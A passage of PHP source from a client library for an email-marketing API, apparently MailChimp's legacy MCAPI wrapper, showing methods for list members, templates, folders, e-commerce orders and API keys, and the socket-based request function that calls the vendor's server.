        $params["email_address"] = $email_address;
        $params["delete_member"] = $delete_member;
        $params["send_goodbye"] = $send_goodbye;
        $params["send_notify"] = $send_notify;
        return $this->callServer("listUnsubscribe", $params);
    }

    function listUpdateMember($id, $email_address, $merge_vars, $email_type='', $replace_interests=true) {
        $params = array();
        $params["id"] = $id;
        $params["email_address"] = $email_address;
        $params["merge_vars"] = $merge_vars;
        $params["email_type"] = $email_type;
        $params["replace_interests"] = $replace_interests;
        return $this->callServer("listUpdateMember", $params);
    }
    function listBatchSubscribe($id, $batch, $double_optin=true, $update_existing=false, $replace_interests=true) {
        $params = array();
        $params["id"] = $id;
        $params["batch"] = $batch;
        $params["double_optin"] = $double_optin;
        $params["update_existing"] = $update_existing;
        $params["replace_interests"] = $replace_interests;
        return $this->callServer("listBatchSubscribe", $params);
    }

    function listBatchUnsubscribe($id, $emails, $delete_member=false, $send_goodbye=true, $send_notify=false) {
        $params = array();
        $params["id"] = $id;
        $params["emails"] = $emails;
        $params["delete_member"] = $delete_member;
        $params["send_goodbye"] = $send_goodbye;
        $params["send_notify"] = $send_notify;
        return $this->callServer("listBatchUnsubscribe", $params);
    }

    function listMembers($id, $status='subscribed', $since=NULL, $start=0, $limit=100) {
        $params = array();
        $params["id"] = $id;
        $params["status"] = $status;
        $params["since"] = $since;
        $params["start"] = $start;
        $params["limit"] = $limit;
        return $this->callServer("listMembers", $params);
    }

    function listMemberInfo($id, $email_address) {
        $params = array();
        $params["id"] = $id;
        $params["email_address"] = $email_address;
        return $this->callServer("listMemberInfo", $params);
    }

    function listMemberActivity($id, $email_address) {
        $params = array();
        $params["id"] = $id;
        $params["email_address"] = $email_address;
        return $this->callServer("listMemberActivity", $params);
    }

    function listAbuseReports($id, $start=0, $limit=500, $since=NULL) {
        $params = array();
        $params["id"] = $id;
        $params["start"] = $start;
        $params["limit"] = $limit;
        $params["since"] = $since;
        return $this->callServer("listAbuseReports", $params);
    }

    function listGrowthHistory($id) {
        $params = array();
        $params["id"] = $id;
        return $this->callServer("listGrowthHistory", $params);
    }
	
    function listActivity($id) {
        $params = array();
        $params["id"] = $id;
        return $this->callServer("listActivity", $params);
    }

    function listLocations($id) {
        $params = array();
        $params["id"] = $id;
        return $this->callServer("listLocations", $params);
    }

    function listClients($id) {
        $params = array();
        $params["id"] = $id;
        return $this->callServer("listClients", $params);
    }

    function templates($types=array (
), $category=NULL, $inactives=array (
)) {
        $params = array();
        $params["types"] = $types;
        $params["category"] = $category;
        $params["inactives"] = $inactives;
        return $this->callServer("templates", $params);
    }

    function templateInfo($tid, $type='user') {
        $params = array();
        $params["tid"] = $tid;
        $params["type"] = $type;
        return $this->callServer("templateInfo", $params);
    }

    function templateAdd($name, $html) {
        $params = array();
        $params["name"] = $name;
        $params["html"] = $html;
        return $this->callServer("templateAdd", $params);
    }

    function templateUpdate($id, $values) {
        $params = array();
        $params["id"] = $id;
        $params["values"] = $values;
        return $this->callServer("templateUpdate", $params);
    }

    function templateDel($id) {
        $params = array();
        $params["id"] = $id;
        return $this->callServer("templateDel", $params);
    }

    function templateUndel($id) {
        $params = array();
        $params["id"] = $id;
        return $this->callServer("templateUndel", $params);
    }

    function getAccountDetails() {
        $params = array();
        return $this->callServer("getAccountDetails", $params);
    }

    function generateText($type, $content) {
        $params = array();
        $params["type"] = $type;
        $params["content"] = $content;
        return $this->callServer("generateText", $params);
    }

    function inlineCss($html, $strip_css=false) {
        $params = array();
        $params["html"] = $html;
        $params["strip_css"] = $strip_css;
        return $this->callServer("inlineCss", $params);
    }

    function folders($type='campaign') {
        $params = array();
        $params["type"] = $type;
        return $this->callServer("folders", $params);
    }

    function folderAdd($name, $type='campaign') {
        $params = array();
        $params["name"] = $name;
        $params["type"] = $type;
        return $this->callServer("folderAdd", $params);
    }
	
    function folderUpdate($fid, $name, $type='campaign') {
        $params = array();
        $params["fid"] = $fid;
        $params["name"] = $name;
        $params["type"] = $type;
        return $this->callServer("folderUpdate", $params);
    }
	
    function folderDel($fid, $type='campaign') {
        $params = array();
        $params["fid"] = $fid;
        $params["type"] = $type;
        return $this->callServer("folderDel", $params);
    }

    function ecommOrders($start=0, $limit=100, $since=NULL) {
        $params = array();
        $params["start"] = $start;
        $params["limit"] = $limit;
        $params["since"] = $since;
        return $this->callServer("ecommOrders", $params);
    }

    function ecommOrderAdd($order) {
        $params = array();
        $params["order"] = $order;
        return $this->callServer("ecommOrderAdd", $params);
    }

    function ecommOrderDel($order_id) {
        $params = array();
        $params["order_id"] = $order_id;
        return $this->callServer("ecommOrderDel", $params);
    }

    function listsForEmail($email_address) {
        $params = array();
        $params["email_address"] = $email_address;
        return $this->callServer("listsForEmail", $params);
    }

    function campaignsForEmail($email_address) {
        $params = array();
        $params["email_address"] = $email_address;
        return $this->callServer("campaignsForEmail", $params);
    }

    function chimpChatter() {
        $params = array();
        return $this->callServer("chimpChatter", $params);
    }

    function apikeys($username, $password, $expired=false) {
        $params = array();
        $params["username"] = $username;
        $params["password"] = $password;
        $params["expired"] = $expired;
        return $this->callServer("apikeys", $params);
    }

    function apikeyAdd($username, $password) {
        $params = array();
        $params["username"] = $username;
        $params["password"] = $password;
        return $this->callServer("apikeyAdd", $params);
    }
	
    function apikeyExpire($username, $password) {
        $params = array();
        $params["username"] = $username;
        $params["password"] = $password;
        return $this->callServer("apikeyExpire", $params);
    }

    function ping() {
        $params = array();
        return $this->callServer("ping", $params);
    }

    function callMethod() {
        $params = array();
        return $this->callServer("callMethod", $params);
    }
	
    function callServer($method, $params) {
	    $dc = "us1";
	    if (strstr($this->api_key,"-")){
        	list($key, $dc) = explode("-",$this->api_key,2);
            if (!$dc) $dc = "us1";
        }
        $host = $dc.".".$this->apiUrl["host"];
		$params["apikey"] = $this->api_key;

        $this->errorMessage = "";
        $this->errorCode = "";
        $post_vars = http_build_query($params);

        $payload = "POST " . $this->apiUrl["path"] . "?" . $this->apiUrl["query"] . "&method=" . $method . " HTTP/1.0\r\n";
        $payload .= "Host: " . $host . "\r\n";
        $payload .= "User-Agent: MCAPI/" . $this->version ."\r\n";
        $payload .= "Content-type: application/x-www-form-urlencoded\r\n";
        $payload .= "Content-length: " . strlen($post_vars) . "\r\n";
        $payload .= "Connection: close \r\n\r\n";
        $payload .= $post_vars;

        ob_start();
        if ($this->secure){
            $sock = fsockopen("ssl://".$host, 443, $errno, $errstr, 30);
        } else {
            $sock = fsockopen($host, 80, $errno, $errstr, 30);
        }
        if(!$sock) {
            $this->errorMessage = "Could not connect (ERR $errno: $errstr)";
            $this->errorCode = "-99";
            ob_end_clean();
            return false;
        }

        $response = "";
        fwrite($sock, $payload);
        stream_set_timeout($sock, $this->timeout);
        $info = stream_get_meta_data($sock);
        while ((!feof($sock)) && (!$info["timed_out"])) {
            $response .= fread($sock, $this->chunkSize);
            $info = stream_get_meta_data($sock);
        }
        if ($info["timed_out"]) {
            $this->errorMessage = "Could not read response (timed out)";
            $this->errorCode = -98;
        }
        fclose($sock);
        ob_end_clean();
        if ($info["timed_out"]) return false;

        list($throw, $response) = explode("\r\n\r\n", $response, 2);

        if(ini_get("magic_quotes_runtime")) $response = stripslashes($response);

        $serial = unserialize($response);
        if($response && $serial === false) {
        	$response = array("error" => "Bad Response.  Got This: " . $response, "code" => "-99");
        } else {
        	$response = $serial;
        }
        if(is_array($response) && isset($response["error"])) {
            $this->errorMessage = $response["error"];
            $this->errorCode = $response["code"];
            return false;
        }

        return $response;
    }

  }

}
?>